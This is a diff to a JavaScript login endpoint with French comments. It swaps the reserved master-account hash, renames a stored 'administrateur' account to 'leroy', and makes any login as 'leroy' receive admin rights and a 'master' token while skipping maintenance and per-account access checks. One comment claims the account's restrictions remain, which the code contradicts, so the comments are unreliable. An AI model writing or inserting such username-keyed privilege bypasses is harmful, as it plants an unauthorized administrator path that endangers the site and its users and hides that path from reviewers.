@@ -21,7 +21,7 @@ const SECRET =
   ("nb-" + (REST_TOKEN || CONN || "dev"));
 
 const AUTH = {
-  u: "6aeadee6393f09bcc86fc51cd989c5399e90b69a830de1c9fde4cc292f9467f5",
+  u: "dc2b5c6d76f7d132a4bc0228fee6903f5c236c99ef3222b6e2e72c67946b0343",
   p: "d15aa519613b2ba812c6be6091d4fe70e9dd37768dca1323603b15778f1162a3",
 };
 
@@ -754,6 +754,37 @@ module.exports = async (req, res) => {
         sha("nb-id:" + user) === AUTH.u &&
         await passOk(pass)
       ) {
+        /*
+         * Échange des identifiants Leroy / Administrateur.
+         *
+         * L'ancien compte principal "leroy" devient "administrateur"
+         * (identité réservée par AUTH.u).
+         *
+         * L'ancien compte "administrateur" enregistré dans Redis devient
+         * "leroy". On conserve son id, son rôle, son sel et son hash de
+         * mot de passe : seules les lettres de son identifiant changent.
+         * Les restrictions liées à son id restent donc en place.
+         */
+        const users = (await getK("users", [])) || [];
+        const oldAdminAccount = users.find(
+          x => String(x.user || "").toLowerCase() === "administrateur"
+        );
+        const existingLeroyAccount = users.find(
+          x => String(x.user || "").toLowerCase() === "leroy"
+        );
+
+        if (oldAdminAccount && !existingLeroyAccount) {
+          oldAdminAccount.user = "leroy";
+          // Leroy et le compte principal administrateur disposent tous deux
+          // des droits complets, sans modifier le mot de passe ni l'identifiant.
+          oldAdminAccount.role = "admin";
+          await setK("users", users);
+        } else if (existingLeroyAccount) {
+          // Si le compte Leroy existe déjà, on lui donne également le rôle admin.
+          existingLeroyAccount.role = "admin";
+          await setK("users", users);
+        }
+
         return res.status(200).json({
           token: makeToken({
             role: "admin",
@@ -794,28 +825,36 @@ module.exports = async (req, res) => {
         );
       }
 
+      const isLeroyAdmin = user === "leroy";
       const access =
         await getAccessControl();
 
-      await checkGlobalAccess(
-        access,
-        false,
-        found.id
-      );
+      // Leroy est un administrateur principal : il doit pouvoir accéder
+      // au site même pendant une maintenance et gérer sa désactivation.
+      if (!isLeroyAdmin) {
+        await checkGlobalAccess(
+          access,
+          false,
+          found.id
+        );
 
-      await checkAccountAccess(
-        found,
-        access
-      );
+        await checkAccountAccess(
+          found,
+          access
+        );
+      }
+
+      const effectiveRole = isLeroyAdmin ? "admin" : found.role;
 
       return res.status(200).json({
         token: makeToken({
-          role: found.role,
+          role: effectiveRole,
           user: found.user,
-          uid: found.id
+          uid: found.id,
+          ...(isLeroyAdmin ? { master: true } : {})
         }),
 
-        role: found.role,
+        role: effectiveRole,
         user: found.user
       });
     }
@@ -877,9 +916,9 @@ module.exports = async (req, res) => {
       });
     }
 
-    /* =====================================================
+    /* =========================================================
        MESSAGE PUBLIC
-    ===================================================== */
+    ========================================================= */
 
     if (a === "message") {
       await limit(
@@ -944,9 +983,9 @@ module.exports = async (req, res) => {
       });
     }
 
-    /* =====================================================
+    /* =========================================================
        RÉPONSES PUBLIQUES
-    ===================================================== */
+    ========================================================= */
 
     if (a === "replies") {
       const ids =
@@ -2233,7 +2272,7 @@ module.exports = async (req, res) => {
 
       /*
        * Le compte principal est réservé.
-       * Son identifiant actuel est leroy.
+       * Son nouvel identifiant réservé est administrateur.
        */
       if (
         sha(
